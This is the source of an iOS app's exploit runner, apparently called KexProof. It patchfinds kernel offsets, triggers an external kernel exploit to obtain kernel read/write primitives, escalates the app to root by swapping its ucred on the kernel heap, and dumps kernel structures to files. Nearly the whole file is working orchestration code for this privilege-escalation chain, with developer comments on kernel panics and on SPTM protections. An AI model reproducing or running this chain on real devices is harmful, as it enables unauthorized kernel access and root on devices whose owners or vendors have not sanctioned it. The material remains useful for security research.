#import "KPRunner.h"
#import "KPLog.h"
#import "KPDump.h"

#import <UIKit/UIKit.h>
#import <errno.h>
#import <fcntl.h>
#import <pthread.h>
#import <stdint.h>
#import <string.h>
#import <sys/utsname.h>
#import <unistd.h>
#import <xpc/xpc.h>

#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/translation.h>

#import "xpf.h"

// ClearSword entry point (Sources/exploit/ClearSword.m)
extern int exploit_init(const char *flavor);

#pragma mark - stdout/stderr capture

// The exploit logs with fprintf(stderr, ...). We redirect both fds into a
// pipe for the duration of the run and forward lines into KPLog so the
// exploit's own progress shows up in the UI and in the report.

static int gOrigStdout = -1;
static int gOrigStderr = -1;
static int gPipeFds[2] = { -1, -1 };
static pthread_t gReaderThread;
static BOOL gCapturing = NO;
// Lifecycle operations may wait for the reader; fd operations must never do so.
static pthread_mutex_t gCaptureLifecycleLock = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t gCaptureFDLock = PTHREAD_MUTEX_INITIALIZER;

static int kpDuplicateFD(int fd)
{
    int result;
    do {
        result = fcntl(fd, F_DUPFD_CLOEXEC, STDERR_FILENO + 1);
    } while (result < 0 && errno == EINTR);
    return result;
}

static int kpReplaceFD(int source, int destination)
{
    int result;
    do {
        result = dup2(source, destination);
    } while (result < 0 && errno == EINTR);
    return result;
}

static void kpCloseFD(int *fd)
{
    int oldFD = *fd;
    *fd = -1;
    // Do not retry close: a concurrently allocated fd could reuse its number.
    if (oldFD >= 0) close(oldFD);
}

static void kpRestoreFD(int original, int destination)
{
    if (kpReplaceFD(original, destination) < 0) {
        // Even if restoration fails, release the pipe writer so join sees EOF.
        close(destination);
    }
}

static ssize_t kpReadCapture(int fd, void *buffer, size_t length)
{
    ssize_t result;
    do {
        result = read(fd, buffer, length);
    } while (result < 0 && errno == EINTR);
    return result;
}

static void kpAppendCapturedLine(NSData *chunk)
{
    NSString *line = [[NSString alloc] initWithData:chunk encoding:NSUTF8StringEncoding];
    if (!line) line = [[NSString alloc] initWithData:chunk encoding:NSISOLatin1StringEncoding];
    // Ignore any legacy NSLog stderr echoes, including an unterminated tail.
    if (line.length && [line rangeOfString:@"KexProof["].location == NSNotFound) {
        [[KPLog shared] append:line];
    }
}

static void *kpReaderMain(void *arg)
{
    const int readFD = (int)(intptr_t)arg;
    @autoreleasepool {
        NSMutableData *pending = [NSMutableData data];
        uint8_t buf[2048];
        for (;;) {
            ssize_t n = kpReadCapture(readFD, buf, sizeof(buf));
            if (n <= 0) break;
            @autoreleasepool {
                [pending appendBytes:buf length:(NSUInteger)n];
                // Forward complete lines; keep the tail for the next round.
                NSUInteger start = 0;
                const uint8_t *bytes = pending.bytes;
                for (NSUInteger i = 0; i < pending.length; i++) {
                    if (bytes[i] == '\n') {
                        kpAppendCapturedLine([pending subdataWithRange:NSMakeRange(start, i - start)]);
                        start = i + 1;
                    }
                }
                if (start > 0) {
                    [pending replaceBytesInRange:NSMakeRange(0, start) withBytes:NULL length:0];
                }
            }
        }
        if (pending.length) kpAppendCapturedLine(pending);
    }
    return NULL;
}

static void kpStartCapture(void)
{
    pthread_mutex_lock(&gCaptureLifecycleLock);
    if (gCapturing) {
        pthread_mutex_unlock(&gCaptureLifecycleLock);
        return;
    }
    BOOL readerStarted = NO;
    BOOL stdoutRedirected = NO;
    BOOL stderrRedirected = NO;
    fflush(stdout);
    fflush(stderr);
    pthread_mutex_lock(&gCaptureFDLock);
    gOrigStdout = kpDuplicateFD(STDOUT_FILENO);
    if (gOrigStdout < 0) goto failed;
    gOrigStderr = kpDuplicateFD(STDERR_FILENO);
    if (gOrigStderr < 0) goto failed;
    if (pipe(gPipeFds) != 0) goto failed;
    if (fcntl(gPipeFds[0], F_SETFD, FD_CLOEXEC) < 0 ||
        fcntl(gPipeFds[1], F_SETFD, FD_CLOEXEC) < 0) goto failed;
    // Drain immediately once either standard descriptor is redirected.
    if (pthread_create(&gReaderThread, NULL, kpReaderMain,
                       (void *)(intptr_t)gPipeFds[0]) != 0) goto failed;
    readerStarted = YES;
    if (kpReplaceFD(gPipeFds[1], STDOUT_FILENO) < 0) goto failed;
    stdoutRedirected = YES;
    if (kpReplaceFD(gPipeFds[1], STDERR_FILENO) < 0) goto failed;
    stderrRedirected = YES;
    gCapturing = YES;
    pthread_mutex_unlock(&gCaptureFDLock);
    pthread_mutex_unlock(&gCaptureLifecycleLock);
    return;

failed:
    if (stdoutRedirected) kpRestoreFD(gOrigStdout, STDOUT_FILENO);
    if (stderrRedirected) kpRestoreFD(gOrigStderr, STDERR_FILENO);
    kpCloseFD(&gOrigStdout);
    kpCloseFD(&gOrigStderr);
    kpCloseFD(&gPipeFds[1]);
    pthread_mutex_unlock(&gCaptureFDLock);
    if (readerStarted) pthread_join(gReaderThread, NULL);
    kpCloseFD(&gPipeFds[0]);
    pthread_mutex_unlock(&gCaptureLifecycleLock);
}

static void kpStopCapture(void)
{
    pthread_mutex_lock(&gCaptureLifecycleLock);
    if (!gCapturing) {
        pthread_mutex_unlock(&gCaptureLifecycleLock);
        return;
    }
    // The reader can call KPForward while flushing or joining; neither may
    // hold gCaptureFDLock, even if stdout's pipe is full.
    fflush(stdout);
    fflush(stderr);
    pthread_mutex_lock(&gCaptureFDLock);
    kpRestoreFD(gOrigStdout, STDOUT_FILENO);
    kpRestoreFD(gOrigStderr, STDERR_FILENO);
    kpCloseFD(&gOrigStdout);
    kpCloseFD(&gOrigStderr);
    kpCloseFD(&gPipeFds[1]); // EOF for the reader
    gCapturing = NO;
    pthread_mutex_unlock(&gCaptureFDLock);
    pthread_join(gReaderThread, NULL);
    kpCloseFD(&gPipeFds[0]);
    pthread_mutex_unlock(&gCaptureLifecycleLock);
}

static void kpWriteOriginalStderr(const char *text)
{
    // A private duplicate stays valid if stop closes/reuses the saved fd, or
    // start redirects STDERR_FILENO while the actual write is in progress.
    pthread_mutex_lock(&gCaptureFDLock);
    int fd = kpDuplicateFD(gOrigStderr >= 0 ? gOrigStderr : STDERR_FILENO);
    pthread_mutex_unlock(&gCaptureFDLock);
    if (fd < 0) return;
    if (!text) text = "";
    size_t remaining = strlen(text);
    while (remaining > 0) {
        ssize_t n = write(fd, text, remaining);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) break;
        text += n;
        remaining -= (size_t)n;
    }
    if (remaining == 0) {
        ssize_t result;
        do {
            result = write(fd, "\n", 1);
        } while (result < 0 && errno == EINTR);
    }
    close(fd);
}

void KPForwardToOriginalStderr(NSString *line)
{
    kpWriteOriginalStderr(line.UTF8String);
}

#pragma mark - Path resolution

static NSString *kpFirstReadable(NSArray<NSString *> *candidates)
{
    for (NSString *path in candidates) {
        if (access(path.fileSystemRepresentation, R_OK) == 0) return path;
    }
    return nil;
}

static NSString *kpResolveKernelcachePath(void)
{
    NSString *bundle = NSBundle.mainBundle.bundlePath;
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    return kpFirstReadable(@[
        @"/System/Library/Caches/com.apple.kernelcaches/kernelcache",
        [bundle stringByAppendingPathComponent:@"kernelcache"],
        [docs stringByAppendingPathComponent:@"kernelcache"],
    ]);
}

static NSString *kpResolveSPTMPath(void)
{
    NSString *bundle = NSBundle.mainBundle.bundlePath;
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    return kpFirstReadable(@[
        [bundle stringByAppendingPathComponent:@"sptm.img4"],
        [docs stringByAppendingPathComponent:@"sptm.img4"],
        [docs stringByAppendingPathComponent:@"sptm.im4p"],
        @"/usr/standalone/firmware/FUD/Ap,SecurePageTableMonitor.img4",
    ]);
}

static NSString *kpResolveTXMPath(void)
{
    NSString *bundle = NSBundle.mainBundle.bundlePath;
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    return kpFirstReadable(@[
        [bundle stringByAppendingPathComponent:@"txm.img4"],
        [docs stringByAppendingPathComponent:@"txm.img4"],
        [docs stringByAppendingPathComponent:@"txm.im4p"],
        @"/usr/standalone/firmware/FUD/Ap,TrustedExecutionMonitor.img4",
    ]);
}

#pragma mark - XPF

static xpc_object_t kpConstructOffsetDictionary(void)
{
    const char *sets[] = { "translation", "trustcache", "physmap", "struct", "physrw", "IOSurface", "sandbox", NULL };
    xpc_object_t full = xpf_construct_offset_dictionary(sets);
    if (full) return full;

    [[KPLog shared] appendFormat:@"Полный словарь оффсетов не собрался (%s) — собираю по одному сету",
        xpf_get_error() ? xpf_get_error() : "нет ошибки"];

    xpc_object_t merged = xpc_dictionary_create_empty();
    for (int i = 0; sets[i]; i++) {
        const char *single[] = { sets[i], NULL };
        xpc_object_t one = xpf_construct_offset_dictionary(single);
        if (one) {
            xpc_dictionary_apply(one, ^bool(const char *key, xpc_object_t value) {
                xpc_dictionary_set_value(merged, key, value);
                return true;
            });
            // ARC manages the xpc dictionary; xpc_release is unavailable here.
        }
        else {
            [[KPLog shared] appendFormat:@"  сет \"%s\" не удался: %s — пропускаю",
                sets[i], xpf_get_error() ? xpf_get_error() : "нет ошибки"];
        }
    }
    return merged;
}

#pragma mark - Runner

@implementation KPRunner

static BOOL sHasKRW = NO;

+ (BOOL)hasKRW
{
    return sHasKRW;
}

+ (void)runExploitWithCompletion:(void (^)(BOOL))completion
{
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        BOOL ok = NO;
        @try {
            ok = [self _runExploitStage];
        }
        @catch (NSException *exception) {
            [[KPLog shared] appendFormat:@"Исключение: %@ — %@", exception.name, exception.reason];
        }
        @finally {
            // A diagnostic exception must not leave stdout/stderr redirected.
            kpStopCapture();
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(ok);
        });
    });
}

+ (void)runDumpWithCompletion:(void (^)(BOOL, NSString *))completion
{
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        BOOL ok = NO;
        NSString *reportPath = nil;
        @try {
            ok = [self _runDumpStage:&reportPath];
        }
        @catch (NSException *exception) {
            [[KPLog shared] appendFormat:@"Исключение: %@ — %@", exception.name, exception.reason];
        }
        @finally {
            kpStopCapture();
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(ok, reportPath);
        });
    });
}

// Stages 1-3: patchfinding, exploit, boot constants + translation. Fast and
// (post-1.5.7) read-only-safe. The long dump lives in _runDumpStage.
+ (BOOL)_runExploitStage
{
    KPLog *log = [KPLog shared];

    struct utsname u;
    uname(&u);
    [log appendFormat:@"=== KexProof %@ — %s, Darwin %s ===",
        [NSBundle.mainBundle objectForInfoDictionaryKey:@"CFBundleShortVersionString"], u.machine, u.release];
    [log appendFormat:@"iOS %@", [UIDevice currentDevice].systemVersion];

    if (sHasKRW && gPrimitives.kreadbuf) {
        [log append:@"KRW-примитивы уже активны — этапы 1-3 пропущены. Жми «Дамп»."];
        return YES;
    }

    // ---------- Stage 1: patchfinding ----------
    [log append:@"\n[Этап 1/4] Патчфайндинг (XPF)"];

    NSString *kernelPath = kpResolveKernelcachePath();
    if (!kernelPath) {
        [log append:@"kernelcache недоступен из песочницы. Положите kernelcache в bundle или в Documents — выход."];
        return NO;
    }
    [log appendFormat:@"kernelcache: %@", kernelPath];

    NSString *sptmPath = kpResolveSPTMPath();
    NSString *txmPath = kpResolveTXMPath();
    [log appendFormat:@"sptm: %@", sptmPath ? sptmPath : @"не найден (SPTM-символы будут пропущены)"];
    [log appendFormat:@"txm: %@", txmPath ? txmPath : @"не найден (TXM-символы будут пропущены)"];
    if (!sptmPath) {
        [log append:@"ВНИМАНИЕ: без sptm.img4 на SPTM-устройстве патчфайндинг, скорее всего, не найдёт physmap/translation-сеты."];
    }

    int xr = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation,
                                        sptmPath ? sptmPath.fileSystemRepresentation : NULL,
                                        txmPath ? txmPath.fileSystemRepresentation : NULL);
    if (xr != 0) {
        [log appendFormat:@"xpf_start_with_kernel_path failed: %s", xpf_get_error() ? xpf_get_error() : "?"];
        xpf_stop();
        return NO;
    }
    [log appendFormat:@"XPF: kernel загружен, base=%#llx darwin=%s sptm=%s txm=%s",
        gXPF.kernelBase, gXPF.darwinVersion ? gXPF.darwinVersion : "?",
        gXPF.sptm ? "да" : "нет", gXPF.txm ? "да" : "нет"];

    xpc_object_t offsetDict = kpConstructOffsetDictionary();
    if (!offsetDict) {
        [log appendFormat:@"xpf_construct_offset_dictionary failed: %s", xpf_get_error() ? xpf_get_error() : "?"];
        xpf_stop();
        return NO;
    }

    xpc_dictionary_set_uint64(offsetDict, "kernelConstant.staticBase", gXPF.kernelBase);
    if (gXPF.sptm) {
        xpc_dictionary_set_uint64(offsetDict, "kernelConstant.staticSptmBase", gXPF.sptmBase);
    }
    if (gXPF.txm) {
        xpc_dictionary_set_uint64(offsetDict, "kernelConstant.staticTxmBase", gXPF.txmBase);
    }

    [log append:@"Словарь оффсетов XPF:"];
    xpc_dictionary_apply(offsetDict, ^bool(const char *key, xpc_object_t value) {
        if (xpc_get_type(value) == XPC_TYPE_UINT64) {
            [[KPLog shared] appendFormat:@"  0x%016llx <- %s", xpc_uint64_get_value(value), key];
        }
        return true;
    });

    jbinfo_initialize_dynamic_offsets(offsetDict);
    jbinfo_initialize_hardcoded_offsets();
    [log append:@"gSystemInfo заполнена (динамические + жёстко заданные оффсеты)"];
    // ARC owns offsetDict; explicit xpc_release is forbidden under ARC.
    xpf_stop();

    // ---------- Stage 2: exploit ----------
    if (!sHasKRW) {
        [log append:@"\n[Этап 2/4] Эксплойт ClearSword (может занять несколько минут)"];
        kpStartCapture();
        int er = exploit_init(NULL);
        kpStopCapture();

        if (er != 0 || !gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
            [log appendFormat:@"Эксплойт НЕ удался (код %d). Можно повторить — кнопка снова активна.", er];
            return NO;
        }
        sHasKRW = YES;
        [log appendFormat:@"Эксплойт УСПЕШЕН. kernel slide = %#llx, kernel base = %#llx",
            gSystemInfo.kernelConstant.slide, kconstant(staticBase) + gSystemInfo.kernelConstant.slide];
        [log appendFormat:@"kreadbuf=%p kwritebuf=%p minSafeRead=0x%x",
            gPrimitives.kreadbuf, gPrimitives.kwritebuf, gPrimitives.krwMinSafeReadSize];
    }

    // ---------- Stage 3: boot constants + translation ----------
    [log append:@"\n[Этап 3/4] Константы загрузки и трансляция адресов"];
    // 1.6.0: no kpStartCapture here or in the dump — since 1.5.3 the engine
    // never writes to stderr, so the pipe was a pure leftover. pipe() is a
    // kernel allocation, and on the post-exploit heap any fresh zone alloc can
    // trip the zalloc bound guard: the dump button panicked the very second it
    // was pressed, before the first kread (panic 14:48, zalloc.c:1308).
    libjailbreak_translation_init();
    [KPDump initializeBootConstantsGuarded];

    // 1.9.0: strategy pivot. The panic registers proved kernel statics are
    // SPTM read-only for EL1 (A0 wrote mach_kobj_count -> permission fault
    // l3; A1's frame_table is SPTM-owned). Heap writes work — the promotion
    // round trip wrote into an inpcb in a zone. So the jailbreak goes the
    // heap way: patch our own proc's ucred -> uid 0. A0/A1 stay as manual
    // buttons only (they document that EL1 statics are closed).
    [log append:@"\n[E9 auto] root через ucred swap — сразу после победы, без нажатий"];
    NSString *e9 = [KPDump ucredHeapSwapReport];
    [log append:e9];
    NSString *docsE9 = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    [e9 writeToFile:[docsE9 stringByAppendingPathComponent:@"kexproof-e9.txt"]
         atomically:YES encoding:NSUTF8StringEncoding error:nil];
    [log appendFormat:@"[E9 auto] uid сейчас: %d (%s)", getuid(), getuid() == 0 ? "ROOT!" : "не root"];

    [log append:@"Этапы 1-3 готовы, KRW жив. Дамп — отдельной кнопкой (дамп пишется инкрементально, паника не сотрёт готовые секции)."];
    return YES;
}

// Stage 4: the long dump. Separate button; the report file is appended
// incrementally per section inside buildReport, so a panic keeps everything
// dumped so far.
+ (BOOL)_runDumpStage:(NSString **)reportPathOut
{
    KPLog *log = [KPLog shared];
    if (!sHasKRW || !gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [log append:@"Дамп невозможен: KRW-примитивы не активны — сначала «Запустить эксплойт»."];
        return NO;
    }

    [log append:@"\n[Этап 4/4] Дамп структур ядра"];
    // 1.6.0: no capture pipe — nothing in the dump writes to stdout/stderr,
    // and pipe() on the corrupted heap was the instant-panic candidate.
    NSString *report = [KPDump buildReport];

    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *path = [docs stringByAppendingPathComponent:@"kexproof-dump.txt"];
    NSString *fullReport = [report stringByAppendingFormat:@"\n\n--- Полный журнал ---\n%@", [KPLog shared].transcript];

    NSError *writeError = nil;
    if (![fullReport writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:&writeError]) {
        [log appendFormat:@"Не удалось записать отчёт: %@", writeError];
        return NO;
    }

    [log appendFormat:@"Отчёт записан: %@", path];
    if (reportPathOut) *reportPathOut = path;
    return YES;
}

@end
